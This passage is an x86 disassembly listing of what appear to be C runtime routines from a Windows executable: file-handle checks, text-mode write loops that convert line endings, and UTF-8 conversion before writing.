  409791:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409794:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409797:	50                   	push   %eax
  409798:	ff 75 0c             	push   0xc(%ebp)
  40979b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40979e:	50                   	push   %eax
  40979f:	e8 44 ff ff ff       	call   0x4096e8
  4097a4:	8b e5                	mov    %ebp,%esp
  4097a6:	5d                   	pop    %ebp
  4097a7:	c3                   	ret
  4097a8:	8b ff                	mov    %edi,%edi
  4097aa:	55                   	push   %ebp
  4097ab:	8b ec                	mov    %esp,%ebp
  4097ad:	51                   	push   %ecx
  4097ae:	56                   	push   %esi
  4097af:	8b 75 08             	mov    0x8(%ebp),%esi
  4097b2:	83 fe fe             	cmp    $0xfffffffe,%esi
  4097b5:	75 0d                	jne    0x4097c4
  4097b7:	e8 3d c4 ff ff       	call   0x405bf9
  4097bc:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4097c2:	eb 4b                	jmp    0x40980f
  4097c4:	85 f6                	test   %esi,%esi
  4097c6:	78 37                	js     0x4097ff
  4097c8:	3b 35 90 51 41 00    	cmp    0x415190,%esi
  4097ce:	73 2f                	jae    0x4097ff
  4097d0:	8b c6                	mov    %esi,%eax
  4097d2:	8b d6                	mov    %esi,%edx
  4097d4:	83 e0 3f             	and    $0x3f,%eax
  4097d7:	c1 fa 06             	sar    $0x6,%edx
  4097da:	6b c8 30             	imul   $0x30,%eax,%ecx
  4097dd:	8b 04 95 90 4f 41 00 	mov    0x414f90(,%edx,4),%eax
  4097e4:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  4097e9:	74 14                	je     0x4097ff
  4097eb:	8d 45 08             	lea    0x8(%ebp),%eax
  4097ee:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4097f1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4097f4:	50                   	push   %eax
  4097f5:	56                   	push   %esi
  4097f6:	e8 85 ff ff ff       	call   0x409780
  4097fb:	59                   	pop    %ecx
  4097fc:	59                   	pop    %ecx
  4097fd:	eb 13                	jmp    0x409812
  4097ff:	e8 f5 c3 ff ff       	call   0x405bf9
  409804:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40980a:	e8 2e c3 ff ff       	call   0x405b3d
  40980f:	83 c8 ff             	or     $0xffffffff,%eax
  409812:	5e                   	pop    %esi
  409813:	8b e5                	mov    %ebp,%esp
  409815:	5d                   	pop    %ebp
  409816:	c3                   	ret
  409817:	8b ff                	mov    %edi,%edi
  409819:	55                   	push   %ebp
  40981a:	8b ec                	mov    %esp,%ebp
  40981c:	83 ec 38             	sub    $0x38,%esp
  40981f:	a1 00 40 41 00       	mov    0x414000,%eax
  409824:	33 c5                	xor    %ebp,%eax
  409826:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409829:	8b 45 0c             	mov    0xc(%ebp),%eax
  40982c:	8b c8                	mov    %eax,%ecx
  40982e:	83 e0 3f             	and    $0x3f,%eax
  409831:	c1 f9 06             	sar    $0x6,%ecx
  409834:	53                   	push   %ebx
  409835:	6b d8 30             	imul   $0x30,%eax,%ebx
  409838:	56                   	push   %esi
  409839:	8b 04 8d 90 4f 41 00 	mov    0x414f90(,%ecx,4),%eax
  409840:	57                   	push   %edi
  409841:	8b 7d 10             	mov    0x10(%ebp),%edi
  409844:	89 7d d0             	mov    %edi,-0x30(%ebp)
  409847:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40984a:	8b 44 18 18          	mov    0x18(%eax,%ebx,1),%eax
  40984e:	89 45 d8             	mov    %eax,-0x28(%ebp)
  409851:	8b 45 14             	mov    0x14(%ebp),%eax
  409854:	03 c7                	add    %edi,%eax
  409856:	89 45 dc             	mov    %eax,-0x24(%ebp)
  409859:	ff 15 2c d0 40 00    	call   *0x40d02c
  40985f:	8b 75 08             	mov    0x8(%ebp),%esi
  409862:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  409865:	89 45 c8             	mov    %eax,-0x38(%ebp)
  409868:	33 c0                	xor    %eax,%eax
  40986a:	89 06                	mov    %eax,(%esi)
  40986c:	89 46 04             	mov    %eax,0x4(%esi)
  40986f:	89 46 08             	mov    %eax,0x8(%esi)
  409872:	3b f9                	cmp    %ecx,%edi
  409874:	0f 83 3d 01 00 00    	jae    0x4099b7
  40987a:	8a 2f                	mov    (%edi),%ch
  40987c:	33 c0                	xor    %eax,%eax
  40987e:	66 89 45 e8          	mov    %ax,-0x18(%ebp)
  409882:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  409885:	88 6d e5             	mov    %ch,-0x1b(%ebp)
  409888:	8b 14 85 90 4f 41 00 	mov    0x414f90(,%eax,4),%edx
  40988f:	8a 4c 1a 2d          	mov    0x2d(%edx,%ebx,1),%cl
  409893:	f6 c1 04             	test   $0x4,%cl
  409896:	74 19                	je     0x4098b1
  409898:	8a 44 1a 2e          	mov    0x2e(%edx,%ebx,1),%al
  40989c:	80 e1 fb             	and    $0xfb,%cl
  40989f:	88 45 f4             	mov    %al,-0xc(%ebp)
  4098a2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4098a5:	6a 02                	push   $0x2
  4098a7:	88 6d f5             	mov    %ch,-0xb(%ebp)
  4098aa:	88 4c 1a 2d          	mov    %cl,0x2d(%edx,%ebx,1)
  4098ae:	50                   	push   %eax
  4098af:	eb 3a                	jmp    0x4098eb
  4098b1:	e8 9c db ff ff       	call   0x407452
  4098b6:	0f b6 0f             	movzbl (%edi),%ecx
  4098b9:	ba 00 80 00 00       	mov    $0x8000,%edx
  4098be:	66 85 14 48          	test   %dx,(%eax,%ecx,2)
  4098c2:	74 24                	je     0x4098e8
  4098c4:	3b 7d dc             	cmp    -0x24(%ebp),%edi
  4098c7:	0f 83 c1 00 00 00    	jae    0x40998e
  4098cd:	6a 02                	push   $0x2
  4098cf:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4098d2:	57                   	push   %edi
  4098d3:	50                   	push   %eax
  4098d4:	e8 de ed ff ff       	call   0x4086b7
  4098d9:	83 c4 0c             	add    $0xc,%esp
  4098dc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4098df:	0f 84 d2 00 00 00    	je     0x4099b7
  4098e5:	47                   	inc    %edi
  4098e6:	eb 18                	jmp    0x409900
  4098e8:	6a 01                	push   $0x1
  4098ea:	57                   	push   %edi
  4098eb:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4098ee:	50                   	push   %eax
  4098ef:	e8 c3 ed ff ff       	call   0x4086b7
  4098f4:	83 c4 0c             	add    $0xc,%esp
  4098f7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4098fa:	0f 84 b7 00 00 00    	je     0x4099b7
  409900:	33 c9                	xor    %ecx,%ecx
  409902:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409905:	51                   	push   %ecx
  409906:	51                   	push   %ecx
  409907:	6a 05                	push   $0x5
  409909:	50                   	push   %eax
  40990a:	6a 01                	push   $0x1
  40990c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40990f:	47                   	inc    %edi
  409910:	50                   	push   %eax
  409911:	51                   	push   %ecx
  409912:	ff 75 c8             	push   -0x38(%ebp)
  409915:	ff 15 bc d0 40 00    	call   *0x40d0bc
  40991b:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40991e:	85 c0                	test   %eax,%eax
  409920:	0f 84 91 00 00 00    	je     0x4099b7
  409926:	6a 00                	push   $0x0
  409928:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40992b:	51                   	push   %ecx
  40992c:	50                   	push   %eax
  40992d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409930:	50                   	push   %eax
  409931:	ff 75 d8             	push   -0x28(%ebp)
  409934:	ff 15 b0 d0 40 00    	call   *0x40d0b0
  40993a:	85 c0                	test   %eax,%eax
  40993c:	74 71                	je     0x4099af
  40993e:	8b 46 08             	mov    0x8(%esi),%eax
  409941:	2b 45 d0             	sub    -0x30(%ebp),%eax
  409944:	03 c7                	add    %edi,%eax
  409946:	89 46 04             	mov    %eax,0x4(%esi)
  409949:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40994c:	39 45 e0             	cmp    %eax,-0x20(%ebp)
  40994f:	72 66                	jb     0x4099b7
  409951:	80 7d e5 0a          	cmpb   $0xa,-0x1b(%ebp)
  409955:	75 2c                	jne    0x409983
  409957:	6a 0d                	push   $0xd
  409959:	58                   	pop    %eax
  40995a:	6a 00                	push   $0x0
  40995c:	66 89 45 e4          	mov    %ax,-0x1c(%ebp)
  409960:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409963:	50                   	push   %eax
  409964:	6a 01                	push   $0x1
  409966:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409969:	50                   	push   %eax
  40996a:	ff 75 d8             	push   -0x28(%ebp)
  40996d:	ff 15 b0 d0 40 00    	call   *0x40d0b0
  409973:	85 c0                	test   %eax,%eax
  409975:	74 38                	je     0x4099af
  409977:	83 7d e0 01          	cmpl   $0x1,-0x20(%ebp)
  40997b:	72 3a                	jb     0x4099b7
  40997d:	ff 46 08             	incl   0x8(%esi)
  409980:	ff 46 04             	incl   0x4(%esi)
  409983:	3b 7d dc             	cmp    -0x24(%ebp),%edi
  409986:	0f 82 ee fe ff ff    	jb     0x40987a
  40998c:	eb 29                	jmp    0x4099b7
  40998e:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  409991:	8a 07                	mov    (%edi),%al
  409993:	8b 0c 95 90 4f 41 00 	mov    0x414f90(,%edx,4),%ecx
  40999a:	88 44 19 2e          	mov    %al,0x2e(%ecx,%ebx,1)
  40999e:	8b 04 95 90 4f 41 00 	mov    0x414f90(,%edx,4),%eax
  4099a5:	80 4c 18 2d 04       	orb    $0x4,0x2d(%eax,%ebx,1)
  4099aa:	ff 46 04             	incl   0x4(%esi)
  4099ad:	eb 08                	jmp    0x4099b7
  4099af:	ff 15 74 d0 40 00    	call   *0x40d074
  4099b5:	89 06                	mov    %eax,(%esi)
  4099b7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4099ba:	8b c6                	mov    %esi,%eax
  4099bc:	5f                   	pop    %edi
  4099bd:	5e                   	pop    %esi
  4099be:	33 cd                	xor    %ebp,%ecx
  4099c0:	5b                   	pop    %ebx
  4099c1:	e8 98 78 ff ff       	call   0x40125e
  4099c6:	8b e5                	mov    %ebp,%esp
  4099c8:	5d                   	pop    %ebp
  4099c9:	c3                   	ret
  4099ca:	8b ff                	mov    %edi,%edi
  4099cc:	55                   	push   %ebp
  4099cd:	8b ec                	mov    %esp,%ebp
  4099cf:	51                   	push   %ecx
  4099d0:	53                   	push   %ebx
  4099d1:	56                   	push   %esi
  4099d2:	8b 75 08             	mov    0x8(%ebp),%esi
  4099d5:	33 c0                	xor    %eax,%eax
  4099d7:	57                   	push   %edi
  4099d8:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4099db:	89 06                	mov    %eax,(%esi)
  4099dd:	89 46 04             	mov    %eax,0x4(%esi)
  4099e0:	89 46 08             	mov    %eax,0x8(%esi)
  4099e3:	8b 45 10             	mov    0x10(%ebp),%eax
  4099e6:	03 c7                	add    %edi,%eax
  4099e8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4099eb:	3b f8                	cmp    %eax,%edi
  4099ed:	73 3f                	jae    0x409a2e
  4099ef:	0f b7 1f             	movzwl (%edi),%ebx
  4099f2:	53                   	push   %ebx
  4099f3:	e8 09 0b 00 00       	call   0x40a501
  4099f8:	59                   	pop    %ecx
  4099f9:	66 3b c3             	cmp    %bx,%ax
  4099fc:	75 28                	jne    0x409a26
  4099fe:	83 46 04 02          	addl   $0x2,0x4(%esi)
  409a02:	83 fb 0a             	cmp    $0xa,%ebx
  409a05:	75 15                	jne    0x409a1c
  409a07:	6a 0d                	push   $0xd
  409a09:	5b                   	pop    %ebx
  409a0a:	53                   	push   %ebx
  409a0b:	e8 f1 0a 00 00       	call   0x40a501
  409a10:	59                   	pop    %ecx
  409a11:	66 3b c3             	cmp    %bx,%ax
  409a14:	75 10                	jne    0x409a26
  409a16:	ff 46 04             	incl   0x4(%esi)
  409a19:	ff 46 08             	incl   0x8(%esi)
  409a1c:	83 c7 02             	add    $0x2,%edi
  409a1f:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  409a22:	72 cb                	jb     0x4099ef
  409a24:	eb 08                	jmp    0x409a2e
  409a26:	ff 15 74 d0 40 00    	call   *0x40d074
  409a2c:	89 06                	mov    %eax,(%esi)
  409a2e:	5f                   	pop    %edi
  409a2f:	8b c6                	mov    %esi,%eax
  409a31:	5e                   	pop    %esi
  409a32:	5b                   	pop    %ebx
  409a33:	8b e5                	mov    %ebp,%esp
  409a35:	5d                   	pop    %ebp
  409a36:	c3                   	ret
  409a37:	8b ff                	mov    %edi,%edi
  409a39:	55                   	push   %ebp
  409a3a:	8b ec                	mov    %esp,%ebp
  409a3c:	51                   	push   %ecx
  409a3d:	56                   	push   %esi
  409a3e:	8b 75 08             	mov    0x8(%ebp),%esi
  409a41:	56                   	push   %esi
  409a42:	e8 68 f8 ff ff       	call   0x4092af
  409a47:	59                   	pop    %ecx
  409a48:	85 c0                	test   %eax,%eax
  409a4a:	75 04                	jne    0x409a50
  409a4c:	32 c0                	xor    %al,%al
  409a4e:	eb 58                	jmp    0x409aa8
  409a50:	57                   	push   %edi
  409a51:	8b fe                	mov    %esi,%edi
  409a53:	83 e6 3f             	and    $0x3f,%esi
  409a56:	c1 ff 06             	sar    $0x6,%edi
  409a59:	6b f6 30             	imul   $0x30,%esi,%esi
  409a5c:	8b 04 bd 90 4f 41 00 	mov    0x414f90(,%edi,4),%eax
  409a63:	f6 44 30 28 80       	testb  $0x80,0x28(%eax,%esi,1)
  409a68:	74 1f                	je     0x409a89
  409a6a:	e8 b5 bd ff ff       	call   0x405824
  409a6f:	8b 40 4c             	mov    0x4c(%eax),%eax
  409a72:	83 b8 a8 00 00 00 00 	cmpl   $0x0,0xa8(%eax)
  409a79:	75 12                	jne    0x409a8d
  409a7b:	8b 04 bd 90 4f 41 00 	mov    0x414f90(,%edi,4),%eax
  409a82:	80 7c 30 29 00       	cmpb   $0x0,0x29(%eax,%esi,1)
  409a87:	75 04                	jne    0x409a8d
  409a89:	32 c0                	xor    %al,%al
  409a8b:	eb 1a                	jmp    0x409aa7
  409a8d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409a90:	50                   	push   %eax
  409a91:	8b 04 bd 90 4f 41 00 	mov    0x414f90(,%edi,4),%eax
  409a98:	ff 74 30 18          	push   0x18(%eax,%esi,1)
  409a9c:	ff 15 28 d0 40 00    	call   *0x40d028
  409aa2:	85 c0                	test   %eax,%eax
  409aa4:	0f 95 c0             	setne  %al
  409aa7:	5f                   	pop    %edi
  409aa8:	5e                   	pop    %esi
  409aa9:	8b e5                	mov    %ebp,%esp
  409aab:	5d                   	pop    %ebp
  409aac:	c3                   	ret
  409aad:	8b ff                	mov    %edi,%edi
  409aaf:	55                   	push   %ebp
  409ab0:	8b ec                	mov    %esp,%ebp
  409ab2:	b8 10 14 00 00       	mov    $0x1410,%eax
  409ab7:	e8 f4 25 00 00       	call   0x40c0b0
  409abc:	a1 00 40 41 00       	mov    0x414000,%eax
  409ac1:	33 c5                	xor    %ebp,%eax
  409ac3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409ac6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409ac9:	8b c1                	mov    %ecx,%eax
  409acb:	c1 f8 06             	sar    $0x6,%eax
  409ace:	83 e1 3f             	and    $0x3f,%ecx
  409ad1:	6b c9 30             	imul   $0x30,%ecx,%ecx
  409ad4:	53                   	push   %ebx
  409ad5:	8b 5d 10             	mov    0x10(%ebp),%ebx
  409ad8:	8b 04 85 90 4f 41 00 	mov    0x414f90(,%eax,4),%eax
  409adf:	56                   	push   %esi
  409ae0:	8b 75 08             	mov    0x8(%ebp),%esi
  409ae3:	57                   	push   %edi
  409ae4:	8b 4c 08 18          	mov    0x18(%eax,%ecx,1),%ecx
  409ae8:	8b 45 14             	mov    0x14(%ebp),%eax
  409aeb:	83 26 00             	andl   $0x0,(%esi)
  409aee:	03 c3                	add    %ebx,%eax
  409af0:	83 66 04 00          	andl   $0x0,0x4(%esi)
  409af4:	83 66 08 00          	andl   $0x0,0x8(%esi)
  409af8:	89 8d f0 eb ff ff    	mov    %ecx,-0x1410(%ebp)
  409afe:	89 85 f8 eb ff ff    	mov    %eax,-0x1408(%ebp)
  409b04:	eb 65                	jmp    0x409b6b
  409b06:	8d bd fc eb ff ff    	lea    -0x1404(%ebp),%edi
  409b0c:	3b d8                	cmp    %eax,%ebx
  409b0e:	73 1e                	jae    0x409b2e
  409b10:	8a 03                	mov    (%ebx),%al
  409b12:	43                   	inc    %ebx
  409b13:	3c 0a                	cmp    $0xa,%al
  409b15:	75 07                	jne    0x409b1e
  409b17:	ff 46 08             	incl   0x8(%esi)
  409b1a:	c6 07 0d             	movb   $0xd,(%edi)
  409b1d:	47                   	inc    %edi
  409b1e:	88 07                	mov    %al,(%edi)
  409b20:	8d 45 fb             	lea    -0x5(%ebp),%eax
  409b23:	47                   	inc    %edi
  409b24:	3b f8                	cmp    %eax,%edi
  409b26:	8b 85 f8 eb ff ff    	mov    -0x1408(%ebp),%eax
  409b2c:	72 de                	jb     0x409b0c
  409b2e:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  409b34:	2b f8                	sub    %eax,%edi
  409b36:	8d 85 f4 eb ff ff    	lea    -0x140c(%ebp),%eax
  409b3c:	6a 00                	push   $0x0
  409b3e:	50                   	push   %eax
  409b3f:	57                   	push   %edi
  409b40:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  409b46:	50                   	push   %eax
  409b47:	51                   	push   %ecx
  409b48:	ff 15 b0 d0 40 00    	call   *0x40d0b0
  409b4e:	85 c0                	test   %eax,%eax
  409b50:	74 1f                	je     0x409b71
  409b52:	8b 85 f4 eb ff ff    	mov    -0x140c(%ebp),%eax
  409b58:	01 46 04             	add    %eax,0x4(%esi)
  409b5b:	3b c7                	cmp    %edi,%eax
  409b5d:	72 1a                	jb     0x409b79
  409b5f:	8b 85 f8 eb ff ff    	mov    -0x1408(%ebp),%eax
  409b65:	8b 8d f0 eb ff ff    	mov    -0x1410(%ebp),%ecx
  409b6b:	3b d8                	cmp    %eax,%ebx
  409b6d:	72 97                	jb     0x409b06
  409b6f:	eb 08                	jmp    0x409b79
  409b71:	ff 15 74 d0 40 00    	call   *0x40d074
  409b77:	89 06                	mov    %eax,(%esi)
  409b79:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409b7c:	8b c6                	mov    %esi,%eax
  409b7e:	5f                   	pop    %edi
  409b7f:	5e                   	pop    %esi
  409b80:	33 cd                	xor    %ebp,%ecx
  409b82:	5b                   	pop    %ebx
  409b83:	e8 d6 76 ff ff       	call   0x40125e
  409b88:	8b e5                	mov    %ebp,%esp
  409b8a:	5d                   	pop    %ebp
  409b8b:	c3                   	ret
  409b8c:	8b ff                	mov    %edi,%edi
  409b8e:	55                   	push   %ebp
  409b8f:	8b ec                	mov    %esp,%ebp
  409b91:	b8 10 14 00 00       	mov    $0x1410,%eax
  409b96:	e8 15 25 00 00       	call   0x40c0b0
  409b9b:	a1 00 40 41 00       	mov    0x414000,%eax
  409ba0:	33 c5                	xor    %ebp,%eax
  409ba2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409ba5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409ba8:	8b c1                	mov    %ecx,%eax
  409baa:	c1 f8 06             	sar    $0x6,%eax
  409bad:	83 e1 3f             	and    $0x3f,%ecx
  409bb0:	6b c9 30             	imul   $0x30,%ecx,%ecx
  409bb3:	53                   	push   %ebx
  409bb4:	8b 5d 10             	mov    0x10(%ebp),%ebx
  409bb7:	8b 04 85 90 4f 41 00 	mov    0x414f90(,%eax,4),%eax
  409bbe:	56                   	push   %esi
  409bbf:	8b 75 08             	mov    0x8(%ebp),%esi
  409bc2:	57                   	push   %edi
  409bc3:	8b 4c 08 18          	mov    0x18(%eax,%ecx,1),%ecx
  409bc7:	8b 45 14             	mov    0x14(%ebp),%eax
  409bca:	03 c3                	add    %ebx,%eax
  409bcc:	89 8d f0 eb ff ff    	mov    %ecx,-0x1410(%ebp)
  409bd2:	33 d2                	xor    %edx,%edx
  409bd4:	89 85 f8 eb ff ff    	mov    %eax,-0x1408(%ebp)
  409bda:	89 16                	mov    %edx,(%esi)
  409bdc:	89 56 04             	mov    %edx,0x4(%esi)
  409bdf:	89 56 08             	mov    %edx,0x8(%esi)
  409be2:	eb 75                	jmp    0x409c59
  409be4:	8d bd fc eb ff ff    	lea    -0x1404(%ebp),%edi
  409bea:	3b d8                	cmp    %eax,%ebx
  409bec:	73 2b                	jae    0x409c19
  409bee:	0f b7 03             	movzwl (%ebx),%eax
  409bf1:	83 c3 02             	add    $0x2,%ebx
  409bf4:	83 f8 0a             	cmp    $0xa,%eax
  409bf7:	75 0d                	jne    0x409c06
  409bf9:	83 46 08 02          	addl   $0x2,0x8(%esi)
  409bfd:	6a 0d                	push   $0xd
  409bff:	5a                   	pop    %edx
  409c00:	66 89 17             	mov    %dx,(%edi)
  409c03:	83 c7 02             	add    $0x2,%edi
  409c06:	66 89 07             	mov    %ax,(%edi)
  409c09:	8d 45 fa             	lea    -0x6(%ebp),%eax
  409c0c:	83 c7 02             	add    $0x2,%edi
  409c0f:	3b f8                	cmp    %eax,%edi
  409c11:	8b 85 f8 eb ff ff    	mov    -0x1408(%ebp),%eax
  409c17:	72 d1                	jb     0x409bea
  409c19:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  409c1f:	2b f8                	sub    %eax,%edi
  409c21:	8d 85 f4 eb ff ff    	lea    -0x140c(%ebp),%eax
  409c27:	6a 00                	push   $0x0
  409c29:	50                   	push   %eax
  409c2a:	83 e7 fe             	and    $0xfffffffe,%edi
  409c2d:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  409c33:	57                   	push   %edi
  409c34:	50                   	push   %eax
  409c35:	51                   	push   %ecx
  409c36:	ff 15 b0 d0 40 00    	call   *0x40d0b0
  409c3c:	85 c0                	test   %eax,%eax
  409c3e:	74 1f                	je     0x409c5f
  409c40:	8b 85 f4 eb ff ff    	mov    -0x140c(%ebp),%eax
  409c46:	01 46 04             	add    %eax,0x4(%esi)
  409c49:	3b c7                	cmp    %edi,%eax
  409c4b:	72 1a                	jb     0x409c67
  409c4d:	8b 85 f8 eb ff ff    	mov    -0x1408(%ebp),%eax
  409c53:	8b 8d f0 eb ff ff    	mov    -0x1410(%ebp),%ecx
  409c59:	3b d8                	cmp    %eax,%ebx
  409c5b:	72 87                	jb     0x409be4
  409c5d:	eb 08                	jmp    0x409c67
  409c5f:	ff 15 74 d0 40 00    	call   *0x40d074
  409c65:	89 06                	mov    %eax,(%esi)
  409c67:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409c6a:	8b c6                	mov    %esi,%eax
  409c6c:	5f                   	pop    %edi
  409c6d:	5e                   	pop    %esi
  409c6e:	33 cd                	xor    %ebp,%ecx
  409c70:	5b                   	pop    %ebx
  409c71:	e8 e8 75 ff ff       	call   0x40125e
  409c76:	8b e5                	mov    %ebp,%esp
  409c78:	5d                   	pop    %ebp
  409c79:	c3                   	ret
  409c7a:	8b ff                	mov    %edi,%edi
  409c7c:	55                   	push   %ebp
  409c7d:	8b ec                	mov    %esp,%ebp
  409c7f:	b8 18 14 00 00       	mov    $0x1418,%eax
  409c84:	e8 27 24 00 00       	call   0x40c0b0
  409c89:	a1 00 40 41 00       	mov    0x414000,%eax
  409c8e:	33 c5                	xor    %ebp,%eax
  409c90:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409c93:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409c96:	8b c1                	mov    %ecx,%eax
  409c98:	c1 f8 06             	sar    $0x6,%eax
  409c9b:	83 e1 3f             	and    $0x3f,%ecx
  409c9e:	6b c9 30             	imul   $0x30,%ecx,%ecx
  409ca1:	53                   	push   %ebx
  409ca2:	56                   	push   %esi
  409ca3:	8b 04 85 90 4f 41 00 	mov    0x414f90(,%eax,4),%eax
  409caa:	33 db                	xor    %ebx,%ebx
  409cac:	8b 75 08             	mov    0x8(%ebp),%esi
  409caf:	57                   	push   %edi
  409cb0:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  409cb4:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409cb7:	8b f9                	mov    %ecx,%edi
  409cb9:	89 85 ec eb ff ff    	mov    %eax,-0x1414(%ebp)
  409cbf:	8b 45 14             	mov    0x14(%ebp),%eax
  409cc2:	03 c1                	add    %ecx,%eax
  409cc4:	89 1e                	mov    %ebx,(%esi)
  409cc6:	89 5e 04             	mov    %ebx,0x4(%esi)
  409cc9:	89 85 f4 eb ff ff    	mov    %eax,-0x140c(%ebp)
  409ccf:	89 5e 08             	mov    %ebx,0x8(%esi)
  409cd2:	3b c8                	cmp    %eax,%ecx
  409cd4:	0f 83 ba 00 00 00    	jae    0x409d94
  409cda:	8b b5 f4 eb ff ff    	mov    -0x140c(%ebp),%esi
  409ce0:	8d 85 50 f9 ff ff    	lea    -0x6b0(%ebp),%eax
  409ce6:	3b fe                	cmp    %esi,%edi
  409ce8:	73 21                	jae    0x409d0b
  409cea:	0f b7 0f             	movzwl (%edi),%ecx
  409ced:	83 c7 02             	add    $0x2,%edi
  409cf0:	83 f9 0a             	cmp    $0xa,%ecx
  409cf3:	75 09                	jne    0x409cfe
  409cf5:	6a 0d                	push   $0xd
  409cf7:	5a                   	pop    %edx
  409cf8:	66 89 10             	mov    %dx,(%eax)
  409cfb:	83 c0 02             	add    $0x2,%eax
  409cfe:	66 89 08             	mov    %cx,(%eax)
  409d01:	83 c0 02             	add    $0x2,%eax
  409d04:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  409d07:	3b c1                	cmp    %ecx,%eax
  409d09:	72 db                	jb     0x409ce6
  409d0b:	53                   	push   %ebx
  409d0c:	53                   	push   %ebx
  409d0d:	68 55 0d 00 00       	push   $0xd55
  409d12:	8d 8d f8 eb ff ff    	lea    -0x1408(%ebp),%ecx
  409d18:	51                   	push   %ecx
  409d19:	8d 8d 50 f9 ff ff    	lea    -0x6b0(%ebp),%ecx
  409d1f:	2b c1                	sub    %ecx,%eax
  409d21:	d1 f8                	sar    $1,%eax
  409d23:	50                   	push   %eax
  409d24:	8b c1                	mov    %ecx,%eax
  409d26:	50                   	push   %eax
  409d27:	53                   	push   %ebx
  409d28:	68 e9 fd 00 00       	push   $0xfde9
  409d2d:	ff 15 bc d0 40 00    	call   *0x40d0bc
  409d33:	8b 75 08             	mov    0x8(%ebp),%esi
  409d36:	89 85 e8 eb ff ff    	mov    %eax,-0x1418(%ebp)
  409d3c:	85 c0                	test   %eax,%eax
  409d3e:	74 4c                	je     0x409d8c
  409d40:	6a 00                	push   $0x0
  409d42:	8d 8d f0 eb ff ff    	lea    -0x1410(%ebp),%ecx
  409d48:	2b c3                	sub    %ebx,%eax
  409d4a:	51                   	push   %ecx
  409d4b:	50                   	push   %eax
  409d4c:	8d 85 f8 eb ff ff    	lea    -0x1408(%ebp),%eax
  409d52:	03 c3                	add    %ebx,%eax
  409d54:	50                   	push   %eax
  409d55:	ff b5 ec eb ff ff    	push   -0x1414(%ebp)
  409d5b:	ff 15 b0 d0 40 00    	call   *0x40d0b0
  409d61:	85 c0                	test   %eax,%eax
  409d63:	74 27                	je     0x409d8c
  409d65:	03 9d f0 eb ff ff    	add    -0x1410(%ebp),%ebx
  409d6b:	8b 85 e8 eb ff ff    	mov    -0x1418(%ebp),%eax
  409d71:	3b d8                	cmp    %eax,%ebx
  409d73:	72 cb                	jb     0x409d40
  409d75:	8b c7                	mov    %edi,%eax
  409d77:	2b 45 10             	sub    0x10(%ebp),%eax
  409d7a:	89 46 04             	mov    %eax,0x4(%esi)
  409d7d:	3b bd f4 eb ff ff    	cmp    -0x140c(%ebp),%edi
  409d83:	73 0f                	jae    0x409d94
  409d85:	33 db                	xor    %ebx,%ebx
  409d87:	e9 4e ff ff ff       	jmp    0x409cda
  409d8c:	ff 15 74 d0 40 00    	call   *0x40d074
  409d92:	89 06                	mov    %eax,(%esi)
  409d94:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409d97:	8b c6                	mov    %esi,%eax
  409d99:	5f                   	pop    %edi
  409d9a:	5e                   	pop    %esi
  409d9b:	33 cd                	xor    %ebp,%ecx
  409d9d:	5b                   	pop    %ebx
  409d9e:	e8 bb 74 ff ff       	call   0x40125e
  409da3:	8b e5                	mov    %ebp,%esp
  409da5:	5d                   	pop    %ebp
  409da6:	c3                   	ret
  409da7:	6a 14                	push   $0x14
  409da9:	68 48 29 41 00       	push   $0x412948
  409dae:	e8 ed 7d ff ff       	call   0x401ba0
  409db3:	8b 75 08             	mov    0x8(%ebp),%esi
  409db6:	83 fe fe             	cmp    $0xfffffffe,%esi
  409db9:	75 18                	jne    0x409dd3
  409dbb:	e8 26 be ff ff       	call   0x405be6
  409dc0:	83 20 00             	andl   $0x0,(%eax)
  409dc3:	e8 31 be ff ff       	call   0x405bf9
  409dc8:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409dce:	e9 b6 00 00 00       	jmp    0x409e89
  409dd3:	85 f6                	test   %esi,%esi
  409dd5:	0f 88 96 00 00 00    	js     0x409e71
  409ddb:	3b 35 90 51 41 00    	cmp    0x415190,%esi
  409de1:	0f 83 8a 00 00 00    	jae    0x409e71
  409de7:	8b de                	mov    %esi,%ebx
